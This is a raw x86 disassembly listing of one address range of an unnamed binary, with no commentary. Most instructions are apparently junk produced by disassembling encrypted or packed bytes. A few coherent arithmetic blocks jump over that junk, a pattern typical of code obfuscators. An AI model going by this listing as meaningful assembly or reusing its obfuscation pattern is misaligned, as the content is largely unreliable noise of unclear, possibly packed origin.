  409348:	or     eax,0x184c76df
  40934d:	out    dx,al
  40934e:	inc    esp
  40934f:	shr    BYTE PTR ds:0x190056d9,cl
  409355:	fcomp  DWORD PTR [ecx+0x25bc492e]
  40935b:	adc    edi,DWORD PTR [esp+eiz*2-0x4c]
  40935f:	pop    edx
  409360:	in     eax,dx
  409361:	dec    eax
  409362:	push   esp
  409363:	jle    0x409317
  409365:	aam    0xeb
  409367:	call   0x51edf49f
  40936c:	inc    esi
  40936d:	and    eax,0x472b8be7
  409372:	mov    ebx,0x5cb20f4b
  409377:	xor    eax,DWORD PTR [edx+0x50]
  40937a:	test   BYTE PTR [ebx+edi*2-0x76dc256a],ch
  409381:	and    al,0xb2
  409383:	repz mov eax,ds:0x600b8abf
  409389:	push   ds
  40938a:	push   esp
  40938b:	cli    
  40938c:	sbb    esp,DWORD PTR [edi+0x78]
  40938f:	jne    0x40939b
  409391:	inc    esi
  409392:	test   BYTE PTR [edx+0x50],0xa8
  409396:	sar    BYTE PTR ds:0xf4ed59a0,1
  40939c:	mov    ecx,0xfa913f60
  4093a1:	mov    ebp,0x459397a6
  4093a6:	add    esi,DWORD PTR [ecx]
  4093a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093a9:	inc    eax
  4093aa:	and    bl,BYTE PTR [eax-0x41]
  4093ad:	mov    edx,0x1e1fb793
  4093b2:	mov    edx,0x656051
  4093b7:	das    
  4093b8:	test   DWORD PTR [ebp+0x1a],edx
  4093bb:	arpl   WORD PTR [edx+edi*4-0x253ba827],cx
  4093c2:	xlat   BYTE PTR ds:[ebx]
  4093c3:	or     dh,BYTE PTR [ecx]
  4093c5:	hlt    
  4093c6:	sub    ecx,DWORD PTR [ebx-0x44f1318b]
  4093cc:	or     dh,BYTE PTR [ebp-0x36]
  4093cf:	xor    BYTE PTR [esi+eiz*4+0x17],bl
  4093d3:	or     DWORD PTR [esi],0xd6df774e
  4093d9:	jle    0x40941c
  4093db:	dec    ebx
  4093dc:	pop    DWORD PTR [edi]
  4093de:	in     eax,dx
  4093df:	loop   0x409437
  4093e1:	sub    eax,0x6b496ff1
  4093e6:	jns    0x409408
  4093e8:	ret    0xc6b6
  4093eb:	into   
  4093ec:	pop    ecx
  4093ed:	push   es
  4093ee:	mov    DWORD PTR [ebx+0x5f55aeeb],edx
  4093f4:	adc    eax,0x82fcc494
  4093f9:	fadd   QWORD PTR [ebp-0x24]
  4093fc:	outs   dx,BYTE PTR ds:[esi]
  4093fd:	mov    ds:0x2275c00,al
  409402:	dec    ebp
  409403:	sub    al,0x48
  409405:	pop    es
  409406:	icebp  
  409407:	fbld   TBYTE PTR [edi+0x2f008f6a]
  40940d:	jbe    0x40948b
  40940f:	pop    ss
  409410:	retf   
  409411:	sub    BYTE PTR [ecx-0x11],0x6b
  409415:	mov    eax,ds:0x2b79d1b
  40941a:	jl     0x409473
  40941c:	jecxz  0x40942d
  40941e:	scas   eax,DWORD PTR es:[edi]
  40941f:	xlat   BYTE PTR ds:[ebx]
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx-0x5552e013]
  409433:	pop    eax
  409434:	ja     0x409434
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0x32eb8a70
  409440:	aas    
  409441:	jae    0x40941a
  409443:	ja     0x40944f
  409445:	jb     0x40940c
  409447:	popa   
  409448:	inc    esi
  409449:	xor    al,0x5
  40944b:	aas    
  40944c:	push   esp
  40944d:	in     eax,dx
  40944e:	add    eax,0xf398d555
  409453:	jl     0x4094c6
  409455:	mov    al,ds:0xb136717b
  40945a:	rcr    BYTE PTR [ebx-0x5d],cl
  40945d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40945e:	les    esi,FWORD PTR [esi]
  409460:	push   0xffffffc7
  409462:	les    edx,FWORD PTR [esp+ebp*2-0x1d780939]
  409469:	push   edi
  40946a:	xchg   edi,eax
  40946b:	bound  edi,QWORD PTR [ecx-0x16e505ba]
  409471:	push   0xffffff8d
  409473:	jl     0x4094b3
  409475:	sahf   
  409476:	mov    dl,0x1e
  409478:	pop    ss
  409479:	jmp    0x5db6:0xba35ab5c
  409480:	mov    esi,0xa4751097
  409485:	inc    edx
  409486:	push   esp
  409487:	fdiv   QWORD PTR [ecx]
  409489:	mov    ah,0xa
  40948b:	daa    
  40948c:	repnz xor al,0x1d
  40948f:	adc    edx,DWORD PTR [ebx+0x7aa3625a]
  409495:	stos   BYTE PTR es:[edi],al
  409496:	in     al,dx
  409497:	lahf   
  409498:	add    al,0x5c
  40949a:	in     al,dx
  40949b:	out    dx,eax
  40949c:	mov    esp,0xd662efcb
  4094a1:	retf   0x51e8
  4094a4:	scas   eax,DWORD PTR es:[edi]
  4094a5:	inc    esi
  4094a6:	aad    0x11
  4094a8:	clc    
  4094a9:	sub    edi,DWORD PTR [edx-0x3b]
  4094ac:	fsubr  DWORD PTR [edx-0x62230223]
  4094b2:	sub    al,0x54
  4094b4:	or     bl,BYTE PTR [ebp-0x6fc868d8]
  4094ba:	adc    eax,DWORD PTR [ebp+0x49951d3b]
  4094c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094c1:	icebp  
  4094c2:	jle    0x409515
  4094c4:	data16 or al,0x46
  4094c7:	popfw  
  4094c9:	pop    ds
  4094ca:	aam    0xc9
  4094cc:	mov    ebx,0xe3ca4581
  4094d1:	push   0x39
  4094d3:	or     dl,bh
  4094d5:	xchg   BYTE PTR [ebx],dl
  4094d7:	iret   
  4094d8:	(bad)  
  4094d9:	stos   DWORD PTR es:[edi],eax
  4094da:	icebp  
  4094db:	cs nop
  4094dd:	das    
  4094de:	cmp    eax,DWORD PTR [ebx-0x2782d97b]
  4094e4:	mov    eax,0xfede3194
  4094e9:	mov    ds:0xe93dac79,al
  4094ee:	lock scas al,BYTE PTR es:[edi]
  4094f0:	sub    ebx,DWORD PTR [edi+0x14]
  4094f3:	jb     0x40947f
  4094f5:	sub    al,al
  4094f7:	adc    BYTE PTR [ebx],dh
  4094f9:	lahf   
  4094fa:	shr    dl,1
  4094fc:	mov    bh,0x23
  4094fe:	jl     0x409537
  409500:	daa    
  409501:	sub    al,0x9a
  409503:	lods   eax,DWORD PTR ds:[esi]
  409504:	aad    0xf8
  409506:	jae    0x409520
  409508:	in     al,0xad
  40950a:	jne    0x4094d8
  40950c:	popa   
  40950d:	popf   
  40950e:	dec    ebx
  40950f:	xchg   ebx,eax
  409510:	inc    esp
  409511:	test   DWORD PTR [ebp-0x760ee42c],ebp
  409517:	jbe    0x409525
  409519:	jb     0x409591
  40951b:	daa    
  40951c:	mov    al,ds:0xdb6617
  409521:	aam    0xe8
  409523:	cld    
  409524:	les    ebp,FWORD PTR [esp+ecx*4-0x4ac1caa3]
  40952b:	inc    ecx
  40952c:	cs call 0xfbfdf0b0
  409532:	sar    DWORD PTR [ecx-0x4c6e7041],cl
  409538:	add    al,0xd9
  40953a:	push   edi
  40953b:	sbb    al,0x7b
  40953d:	push   0x85018f01
  409542:	pop    esi
  409543:	ins    DWORD PTR es:[edi],dx
  409544:	mov    ch,BYTE PTR [ebx]
  409546:	add    esp,DWORD PTR [ecx]
  409548:	mov    ds:0x76e843f1,al
  40954d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40954e:	stos   DWORD PTR es:[edi],eax
  40954f:	mov    ecx,0x65d6aeb7
  409554:	fild   QWORD PTR [edi]
  409556:	outs   dx,BYTE PTR ds:[esi]
  409557:	mov    al,ds:0xb31b60d4
  40955c:	mov    esi,DWORD PTR [esi*4+0x2f1f71c4]
  409563:	mov    al,BYTE PTR [edi+ebp*1-0x3abc679c]
  40956a:	test   al,0xf1
  40956c:	lahf   
  40956d:	adc    esp,edx
  40956f:	jo     0x4095ae
  409571:	imul   edi,DWORD PTR [edx],0x69
  409574:	or     bh,BYTE PTR [edx+0x7735cffe]
  40957a:	and    al,0x61
  40957c:	call   0xb7b2149
  409581:	mov    al,ds:0x3ad96b1d
  409586:	mov    al,0x43
  409588:	in     al,dx
  409589:	ins    DWORD PTR es:[edi],dx
  40958a:	and    BYTE PTR [edi+0x57455303],0x86
  409591:	and    ebx,DWORD PTR [ebx]
  409593:	pop    ebx
  409594:	inc    ebp
  409595:	add    eax,0x5ecc84cd
  40959a:	push   ecx
  40959b:	mov    edi,0x3357d8f6
  4095a0:	cmp    BYTE PTR fs:[eax+0x4099611f],cl
  4095a7:	pop    edx
  4095a8:	jo     0x4095e4
  4095aa:	scas   al,BYTE PTR es:[edi]
  4095ab:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4095ad:	jns    0x4095ac
  4095af:	sub    al,0x34
  4095b1:	out    dx,eax
  4095b2:	scas   al,BYTE PTR es:[edi]
  4095b3:	jle    0x5261ec1f
  4095b9:	rcr    BYTE PTR [edi+0x2e],0x7e
  4095bd:	lock sti 
  4095bf:	cmp    BYTE PTR [ecx+0x40c69b59],ch
  4095c5:	mov    edx,DWORD PTR [eax+0x4d7a39c0]
  4095cb:	push   ecx
  4095cc:	mov    bl,0x95
  4095ce:	retf   0x1987
  4095d1:	xchg   edi,eax
  4095d2:	mov    esp,0x8f449ce4
  4095d7:	call   0xd050df48
  4095dc:	enter  0xa221,0xa7
  4095e0:	mov    edx,0xeccc9c29
  4095e5:	mov    bl,0x7e
  4095e7:	push   ebx
  4095e8:	inc    edx
  4095e9:	dec    edi
  4095ea:	call   0xc36f:0xe29e33f
  4095f1:	loop   0x4095af
  4095f3:	mov    ebp,0x4a3035da
  4095f8:	sub    eax,0xaff8758b
  4095fd:	out    dx,eax
  4095fe:	test   eax,0xf530860e
  409603:	sti    
  409604:	pop    ebp
  409605:	jg     0x409633
  409607:	jmp    0x4095fc
  409609:	add    DWORD PTR [edx],0x2e
  40960c:	mov    ds:0x212c73b6,eax
  409611:	push   ecx
  409612:	sti    
  409613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409614:	xor    ah,BYTE PTR [ebx]
  409616:	sub    eax,0x78be73cd
  40961b:	adc    al,0xea
  40961d:	inc    esp
  40961e:	bnd jmp 0x4095d8
  409621:	mov    dl,0xfd
  409623:	cdq    
  409624:	jmp    0x739f:0xe582ea9f
  40962b:	dec    eax
  40962c:	ja     0x40962c
  40962e:	loope  0x409674
  409630:	fstp   QWORD PTR [ebp*2-0x13aafcbf]
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	jecxz  0x409669
  409655:	adc    eax,0x70e6f74d
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x4095f8
  409660:	add    DWORD PTR [eax+0x78],esi
  409663:	lods   al,BYTE PTR ds:[esi]
  409664:	clc    
  409665:	dec    ecx
  409666:	dec    eax
  409667:	jo     0x4096a0
  409669:	mov    cl,0x56
  40966b:	add    esp,edi
  40966d:	rcl    DWORD PTR [ebx],0x22
  409670:	ja     0x409671
  409672:	lods   eax,DWORD PTR ds:[esi]
  409673:	sub    BYTE PTR [eax+0x62],dl
  409676:	in     al,0x7e
  409678:	jnp    0x40965b
  40967a:	push   ds
  40967b:	pop    ebx
  40967c:	arpl   WORD PTR [ebx+0x4e561076],cx
  409682:	cmp    al,BYTE PTR [esi]
  409684:	mov    edi,0x1b2c7d62
  409689:	or     eax,0x96959434
  40968e:	ror    BYTE PTR [ecx-0x42],1
  409691:	jae    0x409695
  409693:	push   eax
  409694:	add    al,BYTE PTR [edx+ecx*2-0x74b060b]
  40969b:	loop   0x4096e2
  40969d:	xchg   edi,eax
  40969e:	add    al,0xb6
  4096a0:	xor    cl,bl
  4096a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096a3:	push   ecx
  4096a4:	mov    ds:0x9d0a5458,eax
  4096a9:	cdq    
  4096aa:	and    BYTE PTR ds:0x51992725,0xee
  4096b1:	ins    BYTE PTR es:[edi],dx
  4096b2:	shr    ebp,0x13
  4096b5:	jecxz  0x4096fa
  4096b7:	xor    cl,dl
  4096b9:	add    esp,DWORD PTR [eax+0x30a2ae8d]
  4096bf:	std    
  4096c0:	fisubr WORD PTR [ecx+0x6f]
  4096c3:	push   esi
  4096c4:	xchg   edx,eax
  4096c5:	into   
  4096c6:	cld    
  4096c7:	sbb    DWORD PTR [esi-0xa],ebp
  4096ca:	fwait
  4096cb:	out    0xd,al
  4096cd:	mov    ah,0x2c
  4096cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d0:	pop    edx
  4096d1:	call   0x7a45:0xe0d1744
  4096d8:	and    bl,BYTE PTR [esp+edx*4]
  4096db:	dec    esp
  4096dc:	rol    BYTE PTR [esi],cl
  4096de:	xchg   edx,eax
  4096df:	les    esp,FWORD PTR [ebx-0xe]
  4096e2:	add    dh,al
  4096e4:	xchg   ebp,eax
  4096e5:	retf   0xbeaa
  4096e8:	jb     0x409739
  4096ea:	and    edi,ebx
  4096ec:	xchg   edx,eax
  4096ed:	push   ecx
  4096ee:	sub    cl,0xd6
  4096f1:	stc    
  4096f2:	pop    ebp
  4096f3:	xchg   BYTE PTR [edi+0x63a4ad26],ch
  4096f9:	mov    ebp,0xb599ab7
  4096fe:	jbe    0x40977f
  409700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409701:	xor    al,0xf3
  409703:	push   ss
  409704:	je     0x409696
  409706:	mov    eax,0x3307fb86
  40970b:	adc    eax,0xc49476e4
  409710:	pop    es
  409711:	adc    ecx,DWORD PTR [ecx]
  409713:	lds    edx,FWORD PTR [edx+eax*4+0x41]
  409717:	scas   al,BYTE PTR es:[edi]
  409718:	idiv   ebx
  40971a:	fwait
  40971b:	out    dx,al
  40971c:	dec    esp
  40971d:	mov    dl,0xb7
  40971f:	rcr    DWORD PTR [esi],0x3d
  409722:	jp     0x409725
  409724:	mov    DWORD PTR [ebx+0x67],esi
  409727:	mov    ch,0x57
  409729:	jns    0x40976c
  40972b:	cmp    bh,BYTE PTR [ebx-0x7ed4ac5b]
  409731:	in     al,dx
  409732:	dec    ebx
  409733:	cmp    dh,BYTE PTR [ebx+0x35]
  409736:	popa   
  409737:	jbe    0x409798
  409739:	or     al,0xd8
  40973b:	(bad)  
  40973c:	(bad)  
  40973d:	fdivr  QWORD PTR [edx]
  40973f:	mov    al,ds:0x21db7845
  409744:	cmp    ebx,edi
  409746:	call   0x85580e61
  40974b:	int3   
  40974c:	sub    edi,DWORD PTR [ecx+0x30c7dbda]
  409752:	pop    edx
  409753:	aas    
  409754:	lods   eax,DWORD PTR ds:[esi]
  409755:	xchg   edx,eax
  409756:	sbb    edx,DWORD PTR [ebx]
  409758:	lahf   
  409759:	pop    esi
  40975a:	jmp    0x409780
  40975c:	lahf   
  40975d:	clc    
  40975e:	or     edx,ecx
  409760:	mov    ebx,0x82bf9fb6
  409765:	fld    QWORD PTR [edx-0x2ac30bc2]
  40976b:	mov    esi,0xb2e16047
  409770:	test   eax,0x15782981
  409775:	or     bl,al
  409777:	mov    edx,0x458a795b
  40977c:	cli    
  40977d:	pop    esi
  40977e:	js     0x4097d9
  409780:	(bad)  
  409781:	dec    ebp
  409782:	mov    ah,0xe
  409784:	test   DWORD PTR [ebx-0x55ebe3c2],0xa7323d4f
  40978e:	mov    edi,0x2fec6d2
  409793:	mov    ebx,0x97877b54
  409798:	or     al,0xf5
  40979a:	jnp    0x4097d4
  40979c:	stos   BYTE PTR es:[edi],al
  40979d:	stc    
  40979e:	(bad)  
  40979f:	or     al,0x5
  4097a1:	fwait
  4097a2:	int3   
  4097a3:	mov    ds:0x8aa1d584,eax
  4097a8:	ret    0x892b
  4097ab:	lock mov ds:0x255bd0d7,al
  4097b1:	mov    DWORD PTR [edi+ebx*1-0x2de92dee],ecx
  4097b8:	popa   
  4097b9:	mov    ecx,0x593ca227
  4097be:	cli    
  4097bf:	bound  ecx,QWORD PTR [esi+0x35]
  4097c2:	retf   
  4097c3:	push   ds
  4097c4:	mov    ebx,0xfd3fd6f4
  4097c9:	sti    
  4097ca:	jle    0x409837
  4097cc:	stos   DWORD PTR es:[edi],eax
  4097cd:	call   0x5f99:0xdc3f0d86
  4097d4:	and    DWORD PTR [ebx-0x2a50cb49],ecx
  4097da:	xor    ecx,DWORD PTR [esi+0x18]
  4097dd:	add    BYTE PTR [ecx],cl
  4097df:	das    
  4097e0:	ret    0xbb80
  4097e3:	inc    esi
  4097e4:	push   edx
  4097e5:	int3   
  4097e6:	jmp    0xfc3170d3
  4097eb:	nop
  4097ec:	ror    DWORD PTR [ebp+0x38126547],1
  4097f2:	pusha  
  4097f3:	xchg   ebx,eax
  4097f4:	sbb    al,0xd8
  4097f6:	pushf  
  4097f7:	add    ecx,DWORD PTR [eax-0x4e]
  4097fa:	cmp    ah,BYTE PTR [ebp+0x7a]
  4097fd:	push   0x41
  4097ff:	push   0x96808ce3
  409804:	jno    0x409795
  409806:	sbb    al,0x55
  409808:	clc    
  409809:	sub    al,0xce
  40980b:	retf   
  40980c:	int    0xc6
  40980e:	xor    al,0xd7
  409810:	in     al,0xa7
  409812:	add    DWORD PTR [ecx+0x1f775e0b],0x340d2dc1
  40981c:	mov    eax,0x8482e915
  409821:	iret   
  409822:	inc    edx
  409823:	je     0x409876
  409825:	mov    bh,0x12
  409827:	inc    esp
  409828:	setl   BYTE PTR [edi-0x5f]
  40982c:	mul    BYTE PTR [ecx]
  40982e:	shr    DWORD PTR [ecx+0x66e283b0],1
  409834:	sub    DWORD PTR [edx+0x3a93049a],0x70
  40983b:	sbb    al,0x32
  40983d:	test   DWORD PTR [edx-0x70],ebx
  409840:	jecxz  0x40980c
  409842:	pushf  
  409843:	fcomp  QWORD PTR [eax]
  409845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409846:	sub    cl,BYTE PTR [edi-0x41]
  409849:	lods   al,BYTE PTR ds:[esi]
  40984a:	std    
  40984b:	lods   al,BYTE PTR ds:[esi]
  40984c:	in     al,dx
  40984d:	in     eax,dx
  40984e:	and    eax,0x7bb718b5
  409853:	fbld   TBYTE PTR [ebx+0x3]
  409856:	add    edx,ecx
  409858:	imul   edx,edi
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x207bf628
  40989a:	dec    edx
  40989b:	mov    cl,0x29
  40989d:	loopne 0x409883
  40989f:	jo     0x409911
  4098a1:	imul   edi,DWORD PTR [edi+0x70],0x1ab05a70
  4098a8:	xor    DWORD PTR [eax+0x5a29feba],ecx
  4098ae:	call   0x3bbc:0xe0ea8ff7
  4098b5:	inc    ebx
  4098b6:	in     eax,dx
  4098b7:	jns    0x4098ab
  4098b9:	aas    
  4098ba:	jb     0x4098c1
  4098bc:	fmul   st(2),st
  4098be:	ins    DWORD PTR es:[edi],dx
  4098bf:	sti    
  4098c0:	sbb    edi,edi
  4098c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098c3:	lahf   
  4098c4:	shr    DWORD PTR [esp+ebp*1],0xe9
  4098c8:	fmul   QWORD PTR [ebp+0x9]
  4098cb:	ficomp WORD PTR [eax]
  4098cd:	mov    esi,0x876df6ec
  4098d2:	mov    edi,0x355667f5
  4098d7:	scas   eax,DWORD PTR es:[edi]
  4098d8:	cld    
  4098d9:	aaa    
  4098da:	ds xchg edi,eax
  4098dc:	add    dh,BYTE PTR [eax]
  4098de:	add    DWORD PTR [ecx+0x1e],ebp
  4098e1:	mul    DWORD PTR [eax-0x66]
  4098e4:	js     0x40988e
  4098e6:	xor    ebx,DWORD PTR [ebp+0x64]
  4098e9:	mov    ch,BYTE PTR ds:0xc0684689
  4098ef:	mov    bl,al
  4098f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f2:	mov    esp,0x156225b0
  4098f7:	call   0x84be5415
  4098fc:	fist   DWORD PTR [ecx+0x3f]
  4098ff:	and    ch,BYTE PTR [eax-0x40346576]
  409905:	les    ebp,FWORD PTR [ecx-0x12d086e6]
  40990b:	popa   
  40990c:	adc    BYTE PTR [ebp+0xb382063],dh
  409912:	adc    edx,DWORD PTR [eax]
  409914:	rol    DWORD PTR [edi],0x51
  409917:	arpl   WORD PTR [esi],bp
  409919:	(bad)  [esi]
  40991b:	cli    
  40991c:	push   cs
  40991d:	scas   eax,DWORD PTR es:[edi]
  40991e:	cmp    DWORD PTR [esi-0x15],eax
  409921:	mov    ebx,0x84c3a77
  409926:	mov    bh,0xc7
  409928:	retf   
  409929:	in     eax,0x74
  40992b:	sbb    DWORD PTR [edi-0x77],esi
  40992e:	mov    eax,0x1a84ec98
  409933:	lods   eax,DWORD PTR ds:[esi]
  409934:	pop    ds
  409935:	int    0xd5
  409937:	mov    al,ds:0x8b7c9873
  40993c:	xor    eax,0xc1ca3606
  409941:	fwait
  409942:	stos   DWORD PTR es:[edi],eax
  409943:	cmc    
  409944:	cwde   
  409945:	(bad)  
  409946:	in     eax,dx
  409947:	pop    ds
  409948:	jp     0x4099b2
  40994a:	pop    esp
  40994b:	out    0x75,eax
  40994d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40994e:	mov    WORD PTR [esi-0x7d],?
  409951:	xor    DWORD PTR [eax+0x7aaaf853],edi
  409957:	lock xchg edx,eax
  409959:	adc    al,0x3
  40995b:	stos   BYTE PTR es:[edi],al
  40995c:	in     eax,dx
  40995d:	push   cs
  40995e:	mov    al,0x2b
  409960:	cs pop ds
  409962:	mov    esi,0x441bbd7f
  409967:	xchg   DWORD PTR [esi],edx
  409969:	rcr    BYTE PTR [edi-0x4c871f4e],0x50
  409970:	addr16 jae 0x4099df
  409973:	shl    BYTE PTR [ebx],cl
  409975:	mov    dh,0x5c
  409977:	mov    WORD PTR [eax+esi*2+0x71],si
  40997c:	outs   dx,DWORD PTR ds:[esi]
  40997d:	mov    ch,0xbb
  40997f:	scas   eax,DWORD PTR es:[edi]
  409980:	(bad)  
  409982:	xchg   esi,eax
  409983:	xchg   ecx,eax
  409984:	mov    dh,0xf6
  409986:	cmp    al,0x95
  409988:	pop    eax
  409989:	xor    BYTE PTR [ecx-0x5163d56e],cl
  40998f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409990:	push   cs
  409991:	inc    edx
  409992:	pop    ds
  409993:	call   0x4aa0:0x716143cc
  40999a:	in     al,0x25
  40999c:	mov    edi,0x780ded28
  4099a1:	je     0x40995e
  4099a3:	aam    0x2d
  4099a5:	(bad)
  4099aa:	xor    DWORD PTR [ebx-0x77be6ae3],0xffffffe8
  4099b1:	xchg   ecx,eax
  4099b2:	or     eax,0x87bf2ad2
  4099b7:	ds jl  0x409976
  4099ba:	push   edi
  4099bb:	xchg   ebx,eax
  4099bc:	fiadd  WORD PTR [edi-0x139a06b]
  4099c2:	(bad)  
  4099c3:	sbb    eax,0x8222b15c
  4099c8:	pop    edi
  4099c9:	sti    
  4099ca:	pop    es
  4099cb:	or     ecx,ecx
  4099cd:	jo     0x409a24
  4099cf:	xor    eax,0xf1a1fda1
  4099d4:	cmp    DWORD PTR [edx-0x15],0xffffffd5
  4099d8:	imul   eax,DWORD PTR [eax+ebp*8],0xffffffd9
  4099dc:	push   edx
  4099dd:	scas   eax,DWORD PTR es:[edi]
  4099de:	add    BYTE PTR [edx-0x2e],bl
  4099e1:	xchg   BYTE PTR [edi],bh
  4099e3:	(bad)  
  4099e4:	pop    ebx
  4099e5:	loopne 0x4099f4
  4099e7:	mov    eax,0x1668d4bd
  4099ec:	pop    es
  4099ed:	fdivr  QWORD PTR [ecx]
  4099ef:	repnz add al,0x26
  4099f2:	xor    eax,0x92cd3bd8
  4099f7:	fsub   DWORD PTR [ebp-0x4c]
  4099fa:	push   ds
  4099fb:	cmp    cl,ch
  4099fd:	jl     0x409a0c
  4099ff:	sahf   
  409a00:	fnsave [edx]
  409a02:	xchg   edi,eax
  409a03:	outs   dx,DWORD PTR ds:[esi]
  409a04:	jb     0x409a6c
  409a06:	mov    edx,0x44718d3
  409a0b:	inc    ebx
  409a0c:	or     edi,DWORD PTR [ebp+eiz*8-0x27]
  409a10:	out    0x96,al
  409a12:	add    edx,DWORD PTR gs:0x30cdf661
  409a19:	in     eax,dx
  409a1a:	xor    eax,0xd631b81f
  409a1f:	loop   0x4099e0
  409a21:	ss cs xor eax,0x7918f9a2
  409a28:	(bad)  
  409a2a:	retf   
  409a2b:	dec    ebx
  409a2c:	ins    BYTE PTR es:[edi],dx
  409a2d:	sub    ebx,DWORD PTR [ecx-0x49]
  409a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a31:	push   ebx
  409a32:	(bad)  
  409a33:	pusha  
  409a34:	stc    
  409a35:	dec    ecx
  409a36:	mov    eax,DWORD PTR [edi-0x2f]
  409a39:	inc    DWORD PTR [ebp+0x41b3ac6d]
  409a3f:	das    
  409a40:	dec    esi
  409a41:	xchg   edx,eax
  409a42:	shl    BYTE PTR [ecx-0x21],cl
  409a45:	lods   al,BYTE PTR ds:[esi]
  409a46:	sahf   
  409a47:	or     DWORD PTR [eax+0x64],edx
  409a4a:	jl     0x4099f1
  409a4c:	and    cl,BYTE PTR [esi+0x50]
  409a4f:	lock rcr ah,1
  409a52:	or     esi,DWORD PTR [ebp-0x3ff5ceaf]
  409a58:	lahf   
  409a59:	or     BYTE PTR [edx],al
  409a5b:	ins    DWORD PTR es:[edi],dx
  409a5c:	add    eax,0x745126f3
  409a61:	std    
  409a62:	lods   eax,DWORD PTR ds:[esi]
  409a63:	outs   dx,DWORD PTR ss:[esi]
  409a65:	jmp    0x1726:0xa7e52e0d
  409a6c:	hlt    
  409a6d:	stos   BYTE PTR es:[edi],al
  409a6e:	pop    ds
  409a6f:	mov    WORD PTR [ecx+0x1810d77a],gs
  409a75:	aas    
  409a76:	inc    esi
  409a77:	inc    ecx
  409a78:	xlat   BYTE PTR ds:[ebx]
  409a79:	shr    DWORD PTR [edx],cl
  409a7b:	xchg   edi,eax
  409a7c:	aaa    
  409a7d:	jecxz  0x409a3e
  409a7f:	mov    dh,0x9e
  409a81:	mov    ah,0x9c
  409a83:	loope  0x409a8a
  409a85:	mov    dl,0xf8
  409a87:	jae    0x409a85
  409a89:	mov    ds:0x20603b70,al
  409a8e:	push   0x47
  409a90:	xchg   esi,eax
  409a91:	outs   dx,BYTE PTR ds:[esi]
  409a92:	pop    ds
  409a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a94:	cmp    eax,0xadb4e9ef
  409a99:	and    eax,0x7d8bcf63
  409a9e:	fdiv   QWORD PTR [ebx]
  409aa0:	rol    BYTE PTR [ebx],1
  409aa2:	ror    DWORD PTR [edi],1
  409aa4:	scas   eax,DWORD PTR es:[edi]
  409aa5:	xlat   BYTE PTR ds:[ebx]
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    bh,BYTE PTR [ebx-0x2628cf50]
  409ad3:	loop   0x409b45
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409ace
  409adb:	mov    bh,0xb
  409add:	mov    bh,bl
  409adf:	mov    eax,DWORD PTR [esi+ebp*8+0xb]
  409ae3:	test   BYTE PTR [ebp-0x1b8518ac],ch
  409ae9:	xchg   ebp,ecx
  409aeb:	(bad)  
  409aec:	gs and al,0xfa
  409aef:	xchg   ebx,eax
  409af0:	lds    ebx,FWORD PTR [edx]
  409af2:	add    BYTE PTR [ebx+0x31],0xc4
  409af6:	xor    eax,0xf9563926
  409afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409afc:	fsub   QWORD PTR [edi-0x50cec36a]
  409b02:	xchg   ecx,eax
  409b03:	sub    BYTE PTR [esi],al
  409b05:	mov    edx,0xce192052
  409b0a:	shl    DWORD PTR [eax-0x902d953],1
  409b10:	xchg   edi,eax
  409b11:	adc    al,0xa5
  409b13:	or     DWORD PTR [ebp+0x57],ebp
  409b16:	adc    DWORD PTR [ebx-0x80],esi
  409b19:	into   
  409b1a:	pop    esp
  409b1b:	mov    esp,0x94a9ab26
  409b20:	inc    ebp
